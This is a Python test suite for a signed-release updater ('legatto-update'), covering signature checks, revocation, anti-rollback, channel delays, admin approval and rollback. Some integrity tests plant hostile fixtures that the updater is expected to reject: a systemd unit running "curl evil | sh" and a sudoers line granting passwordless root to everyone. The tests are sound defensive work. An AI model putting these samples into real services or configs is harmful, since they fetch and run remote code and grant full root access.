"""End-to-end tests of legatto-update on a local release mirror (CONTRACT section 6, updater).

Every test builds a fresh server root (LEGATTO_TEST_ROOT), a mirror served over
HTTP and programmatic ed25519 keys, then runs the real CLI as a subprocess.
Host tools (docker, systemctl, legatto-*) are the fakes in fakebin/.
"""

import fcntl
import functools
import http.server
import json
import os
import shutil
import subprocess
import sys
import tempfile
import threading
import time
import unittest

HERE = os.path.dirname(os.path.abspath(__file__))
REPO = os.path.normpath(os.path.join(HERE, "..", ".."))
sys.path.insert(0, os.path.join(HERE, "lib"))
sys.path.insert(0, os.path.join(REPO, "updater"))

from mirror import Keys, Mirror, Release, allowed_signers, sha, ts  # noqa: E402

from legatto_update import check, schema  # noqa: E402

PYTHON = os.environ.get("LEGATTO_TEST_PYTHON", sys.executable)
FAKEBIN = os.environ["LEGATTO_TEST_FAKEBIN"]
ADMIN = {"kind": "office-admin", "id": "szef-biura", "node": "laptop-biuro-1"}
BOOTSTRAP = {"kind": "bootstrap", "id": "v-test"}
HOUR = 3600


def load(path):
    with open(path) as fh:
        return json.load(fh)


class Quiet(http.server.SimpleHTTPRequestHandler):
    def log_message(self, *args):
        pass


class Env:
    def __init__(self, channel="canary", window=("00:00", "00:00"), required=1, auto_security=True,
                 signers_file=None):
        self.tmp = tempfile.mkdtemp(prefix="legatto-upd-test-")
        self.root = os.path.join(self.tmp, "root")
        self.keys = Keys(os.path.join(self.tmp, "keys"))
        self.now = float(int(time.time()))
        self.mono = 1000.0
        self.boot = "boot-1"
        www = os.path.join(self.tmp, "www")
        self.mirror = Mirror(os.path.join(www, "v1"), self.keys, self.now)
        handler = functools.partial(Quiet, directory=www)
        self.server = http.server.ThreadingHTTPServer(("127.0.0.1", 0), handler)
        threading.Thread(target=self.server.serve_forever, daemon=True).start()
        self.base_url = "http://127.0.0.1:%d/v1" % self.server.server_address[1]
        self.policy = {
            "schema": "legatto-policy/1", "env": "test", "channel": channel, "update_base_url": self.base_url,
            "signatures_required": required,
            "min_delay_hours": {"feature": {"early": 24, "stable": 48}, "security": {"early": 2, "stable": 4}},
            "auto_security": auto_security, "install_window": {"start": window[0], "end": window[1]},
            "timezone": "Europe/Warsaw", "index_max_validity_days": 35, "health_timeout_seconds": 30,
            "keep_releases": 2, "clock_jump_block_minutes": 60, "max_bundle_bytes": 1 << 30}
        self.layout(signers_file)

    def p(self, rel):
        return os.path.join(self.root, rel.lstrip("/"))

    def write(self, rel, data, mode=0o644):
        path = self.p(rel)
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, "wb" if isinstance(data, bytes) else "w") as fh:
            fh.write(data)
        os.chmod(path, mode)

    def layout(self, signers_file):
        self.write("/etc/legatto/office.env", "\n".join([
            "LEGATTO_CONTRACT_VERSION=1", "LEGATTO_SLUG=testowe", "LEGATTO_ENV=test",
            "LEGATTO_OFFICE_TITLE=Biuro testowe", "LEGATTO_OFFICE_DOMAIN=example.test",
            "LEGATTO_HOST_SITE=example.test", "LEGATTO_HOST_VPN=vpn.example.test",
            "LEGATTO_HOST_CRM=app.example.test", "LEGATTO_HOST_ADMIN=admin.app.example.test",
            "LEGATTO_HOST_STUDIO=studio.app.example.test", "LEGATTO_TS_IP4=100.64.0.1",
            "LEGATTO_TS_IP6=fd7a:115c:a1e0::1", "LEGATTO_PUBLIC_IPV4=192.0.2.10", "LEGATTO_TZ=Europe/Warsaw", ""]))
        self.write("/etc/legatto/update/allowed_signers", signers_file or allowed_signers(self.keys))
        self.write_policy()
        self.keys.krl(self.p("/etc/legatto/update/revoked.krl"))
        self.write("/etc/caddy/Caddyfile", "{\n}\nimport {$LEGATTO_CADDY_SITES:/etc/caddy/sites.d}/*.caddy\n")
        self.write("/opt/legatto/bin/0.0.0/caddy", "#!/bin/sh\necho 'v2.11.9 h1:base'\n", 0o755)
        os.symlink("0.0.0", self.p("/opt/legatto/bin/current"))
        for d in ("/var/lib/legatto/status", "/var/log/legatto", "/run/legatto/keys", "/etc/systemd/system",
                  "/etc/caddy/sites.d", "/fake"):
            os.makedirs(self.p(d), exist_ok=True)
        self.write("/fake/images.json", json.dumps(["docker.io/supabase/postgres@" + self.mirror.db_digest]))

    def write_policy(self):
        self.write("/etc/legatto/update/policy.json", json.dumps(self.policy, indent=2))

    def close(self):
        self.server.shutdown()
        self.server.server_close()
        shutil.rmtree(self.tmp, ignore_errors=True)

    def advance(self, seconds, mono=None):
        self.now += seconds
        self.mono += seconds if mono is None else mono

    def env(self):
        env = dict(os.environ)
        env.update({"LEGATTO_TEST_ROOT": self.root, "LEGATTO_TEST_NOW": ts(self.now),
                    "LEGATTO_TEST_MONO": str(self.mono), "LEGATTO_TEST_BOOT_ID": self.boot,
                    "LEGATTO_TEST_NO_SLEEP": "1", "PYTHONPATH": os.path.join(REPO, "updater"),
                    "PATH": FAKEBIN + os.pathsep + os.environ["PATH"]})
        return env

    def run(self, *args, actor=None):
        argv = [PYTHON, "-m", "legatto_update", "--json"] + list(args)
        if actor is not None:
            argv += ["--actor", json.dumps(actor)]
        proc = subprocess.run(argv, capture_output=True, env=self.env(), timeout=300)
        out = proc.stdout.decode()
        try:
            result = json.loads(out) if out.strip() else None
        except ValueError:
            result = None
        return proc.returncode, result, proc.stderr.decode()

    def status(self):
        with open(self.p("/var/lib/legatto/status/update.json")) as fh:
            return json.load(fh)

    def pending(self, version):
        with open(self.p("/var/lib/legatto/update/pending/%s.json" % version)) as fh:
            return json.load(fh)

    def events(self):
        path = self.p("/var/log/legatto/audit.log")
        if not os.path.exists(path):
            return []
        with open(path) as fh:
            return [json.loads(line) for line in fh]

    def event_names(self):
        return [e["event"] for e in self.events()]

    def installed(self):
        return self.status()["installed"]["version"]

    def current(self):
        return os.path.basename(os.path.realpath(self.p("/opt/legatto/current")))

    def bundle_copy(self):
        dest = os.path.join(self.tmp, "bundle")
        shutil.rmtree(dest, ignore_errors=True)
        shutil.copytree(self.mirror.root, dest)
        return dest

    def fake(self, name, value):
        self.write("/fake/" + name, json.dumps(value))

    def calls(self, tool):
        with open(self.p("/fake/calls.log")) as fh:
            return [json.loads(line)[1:] for line in fh if json.loads(line)[0] == tool]


class Base(unittest.TestCase):
    env_args = {}

    def setUp(self):
        self.e = Env(**self.env_args)
        self.m = self.e.mirror

    def tearDown(self):
        self.e.close()

    def ok(self, res, code=0):
        rc, result, err = res
        self.assertEqual(rc, code, "exit %s, expected %s\nresult=%s\nstderr=%s" % (rc, code, result, err[-2000:]))
        return result

    def bootstrap(self, signers=("release-a",), promote=False):
        r1 = Release("1.0.0", 1, "feature")
        r1.build(self.m, signers=signers)
        if promote:
            self.m.attestation("1.0.0")
            self.m.promote("1.0.0", "early", signers=signers)
            self.m.promote("1.0.0", "stable", signers=signers)
        self.m.index(1, signers=signers)
        self.ok(self.e.run("bootstrap", "--bundle", self.e.bundle_copy(), actor=BOOTSTRAP))
        self.assertEqual(self.e.installed(), "1.0.0")
        return r1

    def next_release(self, version="1.1.0", sequence=2, typ="security", **kw):
        return Release(version, sequence, typ, migrations=["20261115000000_add.sql"],
                       prev_migration="20261101000000", **kw)

    def assert_rejected(self, res, code_word):
        self.ok(res, 10)
        st = self.e.status()
        self.assertEqual(st["upd"], "rej")
        self.assertFalse(st["ok"])
        self.assertEqual(self.e.installed(), "1.0.0")
        self.assertEqual(self.e.current(), "1.0.0")
        rejected = [e for e in self.e.events() if e["event"] == "update.rejected"]
        self.assertTrue(rejected, "no update.rejected audit entry")
        self.assertIn(code_word, json.dumps(rejected[-1]["params"]))
        return st


# --- installation path ------------------------------------------------------------------------
class InstallTests(Base):
    def test_bootstrap_installs_stack(self):
        self.bootstrap()
        e = self.e
        self.assertEqual(e.current(), "1.0.0")
        self.assertEqual(os.readlink(e.p("/opt/legatto/bin/current")), "1.0.0")
        self.assertTrue(os.path.isfile(e.p("/opt/legatto/bin/1.0.0/caddy")))
        self.assertTrue(os.path.isfile(e.p("/etc/systemd/system/legatto-stack.service")))
        self.assertTrue(os.path.isfile(e.p("/etc/caddy/sites.d/crm.caddy")))
        self.assertTrue(os.path.isfile(e.p("/opt/legatto/releases/1.0.0/env/app.env.tmpl")))
        st = e.status()
        self.assertEqual((st["sig"], st["upd"], st["ok"], st["channel"]), ("ok", "ok", True, "canary"))
        self.assertIsNotNone(st["last_check"]["ok_ts"])
        names = e.event_names()
        for ev in ("update.fetched", "update.verified", "update.installing", "update.installed"):
            self.assertIn(ev, names)
        installed = [x for x in e.events() if x["event"] == "update.installed"][0]
        self.assertEqual(installed["actor"], BOOTSTRAP)
        with open(e.p("/fake/db.json")) as fh:
            self.assertEqual(json.load(fh)["level"], "20261101000000")

    def test_bootstrap_refuses_second_time(self):
        self.bootstrap()
        self.ok(self.e.run("bootstrap", "--bundle", self.e.bundle_copy(), actor=BOOTSTRAP), 4)

    def test_security_release_installs_automatically(self):
        self.bootstrap()
        r2 = self.next_release()
        r2.build(self.m)
        self.m.index(2)
        self.ok(self.e.run("run"))
        st = self.e.status()
        self.assertEqual(self.e.installed(), "1.1.0")
        self.assertEqual(self.e.current(), "1.1.0")
        self.assertEqual((st["upd"], st["sig"], st["pending"]), ("ok", "ok", []))
        self.assertEqual(st["installed"]["manifest_sha256"], r2.manifest_sha)
        installed = [x for x in self.e.events() if x["event"] == "update.installed"][-1]
        self.assertEqual(installed["params"]["from_version"], "1.0.0")
        # nothing new: a second run is a no-op
        self.ok(self.e.run("run"))
        self.assertEqual(self.e.installed(), "1.1.0")

    def test_install_window_closed(self):
        self.e.policy["install_window"] = {"start": "02:00", "end": "05:00"}
        self.e.write_policy()
        self.bootstrap()
        import datetime
        import zoneinfo
        local = datetime.datetime.fromtimestamp(self.e.now, zoneinfo.ZoneInfo("Europe/Warsaw"))
        noon = local.replace(hour=12, minute=0, second=0, microsecond=0)
        self.e.advance(noon.timestamp() - self.e.now + 86400)
        r2 = self.next_release()
        self.m.now = self.e.now
        r2.build(self.m)
        self.m.index(2, issued=self.e.now)
        self.ok(self.e.run("run"))
        st = self.e.status()
        self.assertEqual(st["pending"][0]["state"], "waiting-window")
        self.assertEqual(self.e.installed(), "1.0.0")
        expected = noon.replace(hour=2) + datetime.timedelta(days=2)
        self.assertEqual(st["pending"][0]["earliest_install_at"], ts(expected.timestamp()))
        self.e.advance(expected.timestamp() - self.e.now + 60)
        self.ok(self.e.run("run"))
        self.assertEqual(self.e.installed(), "1.1.0")

    def test_yanked_release_is_ignored(self):
        self.bootstrap()
        self.next_release().build(self.m)
        self.m.yanked.add("1.1.0")
        self.m.index(2)
        self.ok(self.e.run("run"))
        self.assertEqual(self.e.installed(), "1.0.0")
        self.assertEqual(self.e.status()["pending"], [])

    def test_worker_deployed_after_health(self):
        self.bootstrap()
        self.next_release(with_worker=True).build(self.m)
        self.m.index(2)
        self.ok(self.e.run("run"))
        calls = self.e.calls("legatto-worker-deploy")
        self.assertEqual(len(calls), 1)
        self.assertIn("--release-dir", calls[0])
        self.assertEqual(self.e.status()["upd"], "ok")


@unittest.skipUnless(shutil.which("dpkg-deb"), "dpkg-deb not available (Ubuntu stage only)")
class DebTests(Base):
    def test_deb_package_installed(self):
        self.bootstrap()
        r2 = self.next_release()
        r2.debs = [("headscale", "headscale", "0.29.7")]
        r2.build(self.m)
        self.m.index(2)
        self.ok(self.e.run("run"))
        self.assertEqual(self.e.installed(), "1.1.0")
        installs = self.e.calls("apt-get")
        self.assertEqual(installs[-1][-1], "./headscale_0.29.7_amd64.deb")

    def test_deb_with_foreign_package_rejected(self):
        self.bootstrap()
        r2 = self.next_release()
        r2.debs = [("headscale", "openssh-server", "0.29.7")]
        r2.build(self.m)
        self.m.index(2)
        self.assert_rejected(self.e.run("run"), "validation")
        self.assertEqual(self.e.calls("apt-get") if os.path.exists(self.e.p("/fake/calls.log")) else [], [])


# --- signatures -------------------------------------------------------------------------------
class SignatureTests(Base):
    def test_bad_signature_rejected_and_alerted(self):
        self.bootstrap()
        self.next_release().build(self.m, signers=("evil:release-a",))
        self.m.index(2)
        st = self.assert_rejected(self.e.run("run"), "manifest-signature")
        self.assertEqual(st["sig"], "bad")

    def test_wrong_namespace_rejected(self):
        self.bootstrap()
        self.next_release().build(self.m, namespace="legatto-promote")
        self.m.index(2)
        self.assert_rejected(self.e.run("run"), "manifest-signature")

    def test_index_bad_signature_is_stale_and_alert(self):
        self.bootstrap()
        self.next_release().build(self.m)
        self.m.index(2, signers=("evil:release-a",))
        self.ok(self.e.run("run"), 10)
        st = self.e.status()
        self.assertEqual((st["sig"], st["ok"]), ("bad", False))
        self.assertIn(st["upd"], ("rej", "stale"))
        self.assertEqual(self.e.installed(), "1.0.0")

    def test_key_in_remote_krl(self):
        self.bootstrap(signers=("release-a",))
        self.next_release().build(self.m, signers=("release-a",))
        # Index and KRL signed by release-b revoke release-a.
        self.m.index(2, signers=("release-b",), krl_revoke=["release-a"])
        self.assert_rejected(self.e.run("run"), "manifest-signature")
        self.assertIn("revoked", json.dumps(self.e.pending("1.1.0")["verify"]))

    def test_key_in_local_krl(self):
        self.bootstrap()
        self.e.keys.krl(self.e.p("/etc/legatto/update/revoked.krl"), ["release-a"])
        self.next_release().build(self.m)
        self.m.index(2)
        self.ok(self.e.run("run"), 10)
        self.assertEqual(self.e.status()["sig"], "bad")
        self.assertEqual(self.e.installed(), "1.0.0")

    def test_too_few_signatures(self):
        self.e.policy["signatures_required"] = 2
        self.e.write_policy()
        both = ("release-a", "release-b")
        self.bootstrap(signers=both)
        self.next_release().build(self.m, signers=("release-a",))
        self.m.index(2, signers=both)
        self.assert_rejected(self.e.run("run"), "manifest-signature")

    def test_two_signatures_same_key(self):
        self.e.close()
        keys_env = Env()
        keys = keys_env.keys
        same = "\n".join([
            'release-a@legatto.pl namespaces="legatto-release,legatto-promote,legatto-index,legatto-revoke" '
            + keys.pub("release-a"),
            'release-b@legatto.pl namespaces="legatto-release,legatto-promote,legatto-index,legatto-revoke" '
            + keys.pub("release-a"),
            'canary@legatto.pl namespaces="legatto-canary" ' + keys.pub("canary"), ""])
        keys_env.write("/etc/legatto/update/allowed_signers", same)
        keys_env.policy["signatures_required"] = 2
        keys_env.write_policy()
        self.e, self.m = keys_env, keys_env.mirror
        twice = ("release-a:release-a", "release-a:release-b")
        r1 = Release("1.0.0", 1)
        r1.build(self.m, signers=twice)
        self.m.index(1, signers=twice)
        self.ok(self.e.run("bootstrap", "--bundle", self.e.bundle_copy(), actor=BOOTSTRAP), 10)
        self.assertEqual(self.e.status()["sig"], "bad")
        self.assertIsNone(self.e.status()["installed"]["version"])


# --- integrity, anti-rollback, rules --------------------------------------------------------
class IntegrityTests(Base):
    def test_modified_artifact(self):
        self.bootstrap()
        r2 = self.next_release()
        r2.tamper_after_sign = "config.tar.gz"
        r2.build(self.m)
        self.m.index(2)
        self.assert_rejected(self.e.run("run"), "artifact-hash")

    def test_modified_image_digest(self):
        self.bootstrap()
        r2 = self.next_release()
        r2.image_digest_override = "sha256:" + "e" * 64
        r2.build(self.m)
        self.m.index(2)
        self.assert_rejected(self.e.run("run"), "image-digest")

    def test_older_sequence(self):
        self.bootstrap()
        # newer version, but the sequence of the installed release (an index cannot
        # list two releases with one sequence, so only the new one is published)
        Release("1.1.0", 1, migrations=()).build(self.m)
        self.m.index(2, versions=["1.1.0"])
        self.assert_rejected(self.e.run("run"), "older-sequence")

    def test_older_version(self):
        self.bootstrap()
        Release("0.9.0", 7, migrations=()).build(self.m)
        self.m.index(2, versions=["1.0.0", "0.9.0"])
        self.assert_rejected(self.e.run("run"), "older-version")

    def test_config_outside_allowlist(self):
        self.bootstrap()
        r2 = self.next_release()
        r2.extra_config = {"etc/sudoers.d/legatto": (b"ALL ALL=(ALL) NOPASSWD: ALL\n", "compose")}
        r2.build(self.m)
        self.m.index(2)
        self.assert_rejected(self.e.run("run"), "manifest-rules")

    def test_config_file_not_in_manifest(self):
        self.bootstrap()
        r2 = self.next_release()
        r2.unlisted_config = {"compose/extra.yml": b"services: {}\n"}
        r2.build(self.m)
        self.m.index(2)
        self.assert_rejected(self.e.run("run"), "artifact-content")

    def test_n_minus_1_incompatible(self):
        self.bootstrap()
        r2 = self.next_release()
        r2.manifest_patch = {"migrations": {"from": "20261101000000", "to": "20261101000000", "count": 0,
                                            "files": [], "n_minus_1_compatible": False}}
        r2.migrations = []
        r2.build(self.m)
        self.m.index(2)
        self.assert_rejected(self.e.run("run"), "manifest-schema")

    def test_unit_running_shell_as_root_rejected_before_any_change(self):
        self.bootstrap()
        r2 = self.next_release()
        r2.extra_config = {"systemd/legatto-secrets-render.service": (
            b"[Service]\nExecStart=/bin/sh -c 'curl evil | sh'\n", "systemd-unit")}
        r2.build(self.m)
        self.m.index(2)
        self.assert_rejected(self.e.run("run"), "validation")
        self.assertFalse(os.path.exists(self.e.p("/etc/systemd/system/legatto-secrets-render.service")))
        self.assertEqual(os.readlink(self.e.p("/opt/legatto/bin/current")), "1.0.0")

    def test_pinned_egress_removed(self):
        self.bootstrap()
        r2 = self.next_release()
        r2.egress = {"version": 1, "roles": {"app": [{"host": "api.resend.com", "port": 443, "purpose": "mail"}]},
                     "features": {}}
        r2.build(self.m)
        self.m.index(2)
        self.assert_rejected(self.e.run("run"), "egress-pinned")

    def test_index_expired(self):
        self.bootstrap()
        self.next_release().build(self.m)
        self.m.index(2, issued=self.e.now - 10 * 86400, expires=self.e.now - 60)
        self.ok(self.e.run("run"), 15)
        st = self.e.status()
        self.assertEqual((st["upd"], st["ok"], st["last_check"]["ok"]), ("stale", False, False))
        self.assertEqual(self.e.installed(), "1.0.0")
        self.assertIn("update.stale", self.e.event_names())

    def test_index_validity_too_long(self):
        self.bootstrap()
        self.m.index(2, expires=self.e.now + 40 * 86400)
        self.ok(self.e.run("run"), 15)
        self.assertEqual(self.e.status()["upd"], "stale")

    def test_index_rolled_back(self):
        self.bootstrap()
        old = self.m.index(2)
        self.m.index(3)
        self.ok(self.e.run("run"))
        # replay of an older, validly signed index
        with open(os.path.join(self.m.root, "index.json"), "wb") as fh:
            fh.write(old)
        self.m.write_doc("index.json", old, ("release-a",), "legatto-index")
        self.ok(self.e.run("run"), 15)
        self.assertEqual(self.e.status()["upd"], "stale")


# --- channels, delays, approval -----------------------------------------------------------------
class GateTests(Base):
    env_args = {"channel": "stable"}

    def test_stable_needs_promotion_then_delay(self):
        self.bootstrap(promote=True)
        self.next_release().build(self.m)
        self.m.index(2)
        self.ok(self.e.run("run"))
        self.assertEqual(self.e.status()["pending"][0]["state"], "waiting-promotion")
        self.m.attestation("1.1.0")
        self.m.promote("1.1.0", "early")
        self.m.index(3)
        self.ok(self.e.run("run"))
        self.assertEqual(self.e.status()["pending"][0]["state"], "waiting-promotion")
        self.m.promote("1.1.0", "stable")
        self.m.index(4)
        self.ok(self.e.run("run"))
        st = self.e.status()
        self.assertEqual((st["pending"][0]["state"], st["upd"]), ("waiting-delay", "waiting"))
        self.assertEqual(st["pending"][0]["earliest_install_at"], ts(self.e.now + 4 * HOUR))
        self.e.advance(3 * HOUR)
        self.ok(self.e.run("run"))
        self.assertEqual(self.e.installed(), "1.0.0")
        self.e.advance(HOUR + 60)
        self.ok(self.e.run("run"))
        self.assertEqual(self.e.installed(), "1.1.0")

    def test_failed_canary_attestation_blocks(self):
        self.bootstrap(promote=True)
        self.next_release().build(self.m)
        self.m.attestation("1.1.0", result="FAIL")
        self.m.index(2)
        self.ok(self.e.run("run"))
        self.assertEqual(self.e.status()["pending"][0]["state"], "waiting-promotion")

    def test_forged_promoted_at_does_not_shorten_delay(self):
        self.bootstrap(promote=True)
        self.next_release().build(self.m)
        self.m.attestation("1.1.0")
        old = ts(self.e.now - 30 * 86400)
        self.m.promote("1.1.0", "early", promoted_at=old)
        self.m.promote("1.1.0", "stable", promoted_at=old)
        self.m.index(2)
        self.ok(self.e.run("run"))
        self.assertEqual(self.e.status()["pending"][0]["state"], "waiting-delay")
        self.assertEqual(self.e.installed(), "1.0.0")

    def test_clock_jump_does_not_accelerate(self):
        self.bootstrap(promote=True)
        self.next_release().build(self.m)
        self.m.attestation("1.1.0")
        self.m.promote("1.1.0", "early")
        self.m.promote("1.1.0", "stable")
        self.m.index(2)
        self.ok(self.e.run("run"))
        # Wall clock moved 3 days ahead while only 30 minutes really passed.
        self.e.advance(3 * 86400, mono=1800)
        self.ok(self.e.run("run"), 16)
        self.assertIn("update.clock_jump", self.e.event_names())
        self.assertEqual(self.e.installed(), "1.0.0")
        self.assertEqual(self.e.status()["pending"][0]["state"], "waiting-delay")
        self.e.advance(4 * HOUR)
        self.ok(self.e.run("run"))
        self.assertEqual(self.e.installed(), "1.1.0")

    def test_promotion_signed_by_unknown_key(self):
        self.bootstrap(promote=True)
        self.next_release().build(self.m)
        self.m.attestation("1.1.0")
        self.m.promote("1.1.0", "early", signers=("evil:release-a",))
        self.m.promote("1.1.0", "stable")
        self.m.index(2)
        self.assert_rejected(self.e.run("run"), "promotion-signature")

    def test_attestation_by_release_key_does_not_count(self):
        self.bootstrap(promote=True)
        self.next_release().build(self.m)
        self.m.attestation("1.1.0", signer="release-a:canary")
        self.m.promote("1.1.0", "early")
        self.m.promote("1.1.0", "stable")
        self.m.index(2)
        self.assert_rejected(self.e.run("run"), "attestation-signature")


class ApprovalTests(Base):
    def test_feature_needs_admin_approval(self):
        self.bootstrap()
        r2 = self.next_release(typ="feature")
        r2.build(self.m)
        self.m.index(2)
        self.ok(self.e.run("run"))
        st = self.e.status()
        self.assertEqual((st["upd"], st["pending"][0]["state"]), ("pending", "waiting-approval"))
        pend = self.e.pending("1.1.0")
        self.assertTrue(pend["needs_approval"])
        self.assertTrue(pend["verify"]["ok"])
        self.assertEqual(pend["signers"]["manifest"], ["release-a@legatto.pl"])
        self.assertIn("Zmiany testowe", pend["notes_md"])
        self.assertIn("update.pending", self.e.event_names())
        self.ok(self.e.run("run"))
        self.assertEqual(self.e.installed(), "1.0.0")
        # wrong hash is refused
        self.ok(self.e.run("approve", "--release", "1.1.0", "--manifest-sha256", "0" * 64, actor=ADMIN), 10)
        res = self.ok(self.e.run("approve", "--release", "1.1.0", "--manifest-sha256", r2.manifest_sha, actor=ADMIN))
        self.assertEqual(res["code"], "approved")
        approved = [x for x in self.e.events() if x["event"] == "update.approved"][-1]
        self.assertEqual(approved["node"], "laptop-biuro-1")
        self.ok(self.e.run("run"))
        self.assertEqual(self.e.installed(), "1.1.0")

    def test_reject_by_admin(self):
        self.bootstrap()
        r2 = self.next_release(typ="feature")
        r2.build(self.m)
        self.m.index(2)
        self.ok(self.e.run("run"))
        self.ok(self.e.run("reject", "--release", "1.1.0", "--manifest-sha256", r2.manifest_sha,
                           "--reason", "nie teraz", actor=ADMIN))
        self.ok(self.e.run("run"))
        st = self.e.status()
        self.assertEqual((st["pending"][0]["state"], st["upd"]), ("rejected", "ok"))
        self.assertIn("update.declined", self.e.event_names())

    def test_egress_widening_holds_security_release(self):
        self.bootstrap()
        r2 = self.next_release()
        r2.egress["roles"]["app"].append({"host": "collector.example.com", "port": 443, "purpose": "x"})
        r2.build(self.m)
        self.m.index(2)
        self.ok(self.e.run("run"))
        st = self.e.status()
        self.assertEqual(st["pending"][0]["state"], "waiting-approval")
        self.assertTrue(st["pending"][0]["egress_widening"])
        pend = self.e.pending("1.1.0")
        self.assertEqual(pend["egress"]["added"][0]["host"], "collector.example.com")
        self.assertEqual(self.e.installed(), "1.0.0")
        self.ok(self.e.run("approve", "--release", "1.1.0", "--manifest-sha256", r2.manifest_sha, actor=ADMIN))
        self.ok(self.e.run("run"))
        self.assertEqual(self.e.installed(), "1.1.0")

    def test_security_optout(self):
        self.bootstrap()
        self.ok(self.e.run("autosecurity", "--enabled", "false", actor=ADMIN))
        r2 = self.next_release()
        r2.build(self.m)
        self.m.index(2)
        self.ok(self.e.run("run"))
        self.assertEqual(self.e.status()["upd"], "optout")
        self.assertEqual(self.e.installed(), "1.0.0")
        self.assertIn("update.autosecurity", self.e.event_names())

    def test_autosecurity_cannot_enable_against_policy(self):
        self.e.policy["auto_security"] = False
        self.e.write_policy()
        self.bootstrap()
        self.ok(self.e.run("autosecurity", "--enabled", "true", actor=ADMIN), 4)


# --- rollback -------------------------------------------------------------------------------------
class RollbackTests(Base):
    def test_failed_health_check_rolls_back(self):
        self.bootstrap()
        self.next_release().build(self.m)
        self.m.index(2)
        self.e.fake("unhealthy.json", ["1.1.0"])
        self.ok(self.e.run("run"), 13)
        e = self.e
        st = e.status()
        self.assertEqual((e.installed(), e.current()), ("1.0.0", "1.0.0"))
        self.assertEqual((st["upd"], st["ok"]), ("rb", False))
        self.assertEqual(os.readlink(e.p("/opt/legatto/bin/current")), "1.0.0")
        rolled = [x for x in e.events() if x["event"] == "update.rolled_back"]
        self.assertTrue(rolled and rolled[-1]["params"]["automatic"])
        with open(e.p("/fake/egress_applied")) as fh:
            self.assertTrue(fh.read().endswith("/releases/1.0.0"))
        # the database is not rolled back
        with open(e.p("/fake/db.json")) as fh:
            self.assertEqual(json.load(fh)["level"], "20261115000000")
        # the failed release is not retried automatically
        self.ok(e.run("run"))
        self.assertEqual(e.installed(), "1.0.0")
        self.assertEqual(e.status()["upd"], "rb")

    def test_admin_rollback_one_command(self):
        self.bootstrap()
        r2 = self.next_release()
        r2.build(self.m)
        self.m.index(2)
        self.ok(self.e.run("run"))
        self.assertEqual(self.e.installed(), "1.1.0")
        res = self.ok(self.e.run("rollback", actor=ADMIN))
        self.assertEqual(res["code"], "rolled_back")
        st = self.e.status()
        self.assertEqual((self.e.installed(), self.e.current()), ("1.0.0", "1.0.0"))
        self.assertEqual(st["upd"], "vuln")
        self.ok(self.e.run("run"))
        self.assertEqual(self.e.installed(), "1.0.0")
        self.ok(self.e.run("approve", "--release", "1.1.0", "--manifest-sha256", r2.manifest_sha, actor=ADMIN))
        self.ok(self.e.run("run"))
        self.assertEqual(self.e.installed(), "1.1.0")
        self.assertEqual(self.e.status()["upd"], "ok")

    def test_rollback_without_previous(self):
        self.bootstrap()
        self.ok(self.e.run("rollback", actor=ADMIN), 4)


# --- misc -----------------------------------------------------------------------------------------
class MiscTests(Base):
    def test_lock_busy(self):
        os.makedirs(self.e.p("/run/legatto"), exist_ok=True)
        fd = os.open(self.e.p("/run/legatto/update.lock"), os.O_RDWR | os.O_CREAT)
        fcntl.flock(fd, fcntl.LOCK_EX)
        try:
            self.ok(self.e.run("fetch"), 3)
        finally:
            os.close(fd)

    def test_json_flag_after_subcommand(self):
        """argv exactly as office-console's executor builds it (CONTRACT 4.6: --json in every command)."""
        from legatto_update import cli
        # office-console Context.actor, serialized like Context.actor_json
        actor = json.dumps({"kind": "office-admin", "id": "szef-biura", "ip": "fd7a:115c:a1e0::5",
                            "node": "laptop-biuro-1"}, sort_keys=True, ensure_ascii=False)
        sha_ = "a" * 64
        argvs = [
            ["approve", "--release", "1.1.0", "--manifest-sha256", sha_, "--not-before", "2026-11-22T22:00:00Z",
             "--actor", actor, "--json"],
            ["approve", "--release", "1.1.0", "--manifest-sha256", sha_, "--actor", actor, "--json"],
            ["reject", "--release", "1.1.0", "--manifest-sha256", sha_, "--reason", "nie teraz", "--actor", actor,
             "--json"],
            ["rollback", "--to", "1.0.0", "--actor", actor, "--json"],
            ["rollback", "--actor", actor, "--json"],
            ["autosecurity", "--enabled", "false", "--actor", actor, "--json"],
            ["status", "--json"],
        ]
        parser = cli.build_parser()
        for argv in argvs:
            self.assertTrue(parser.parse_args(argv).json, argv)
            self.assertTrue(parser.parse_args(["--json"] + argv[:-1]).json, argv)
        self.assertFalse(parser.parse_args(["status"]).json)
        # end to end: the real CLI, flag after the subcommand
        self.bootstrap()
        r2 = self.next_release(typ="feature")
        r2.build(self.m)
        self.m.index(2)
        self.ok(self.e.run("run"))
        proc = subprocess.run([PYTHON, "-m", "legatto_update", "approve", "--release", "1.1.0", "--manifest-sha256",
                               r2.manifest_sha, "--actor", actor, "--json"], capture_output=True, env=self.e.env())
        self.assertEqual(proc.returncode, 0, proc.stderr.decode())
        self.assertEqual(json.loads(proc.stdout)["code"], "approved")
        proc = subprocess.run([PYTHON, "-m", "legatto_update", "status", "--json"], capture_output=True,
                              env=self.e.env())
        self.assertEqual(proc.returncode, 0, proc.stderr.decode())
        self.assertEqual(json.loads(proc.stdout)["component"], "update")

    def test_usage_errors(self):
        self.ok(self.e.run("approve", "--release", "x", "--manifest-sha256", "0" * 64, actor=ADMIN), 2)
        self.ok(self.e.run("rollback", actor={"kind": "nobody", "id": "x"}), 2)

    def test_missing_policy_is_precondition(self):
        os.unlink(self.e.p("/etc/legatto/update/policy.json"))
        self.ok(self.e.run("fetch"), 4)

    def test_attest_on_canary(self):
        self.bootstrap()
        os.makedirs(self.e.p("/etc/legatto/secrets"), exist_ok=True)
        shutil.copyfile(self.e.keys.get("canary"), self.e.p("/etc/legatto/secrets/update-canary-ed25519"))
        os.chmod(self.e.p("/etc/legatto/secrets/update-canary-ed25519"), 0o600)
        report = os.path.join(self.e.tmp, "report.json")
        with open(report, "w") as fh:
            json.dump({"v": 1, "office": "testowe", "release": "1.0.0", "result": "PASS", "failed_checks": [],
                       "checks": [], "started_at": ts(self.e.now), "finished_at": ts(self.e.now)}, fh)
        self.ok(self.e.run("attest", "--release", "1.0.0", "--report", report))
        out = self.e.p("/var/lib/legatto/update/attest/1.0.0/canary.json")
        with open(out, "rb") as fh:
            data = fh.read()
        doc = json.loads(data)
        self.assertEqual(schema.validate("attestation", doc), [])
        self.assertEqual(doc["result"], "PASS")
        proc = subprocess.run(["ssh-keygen", "-Y", "verify", "-f", self.e.p("/etc/legatto/update/allowed_signers"),
                               "-I", "canary@legatto.pl", "-n", "legatto-canary", "-s", out + ".canary.sig"],
                              input=data, capture_output=True)
        self.assertEqual(proc.returncode, 0, proc.stderr)

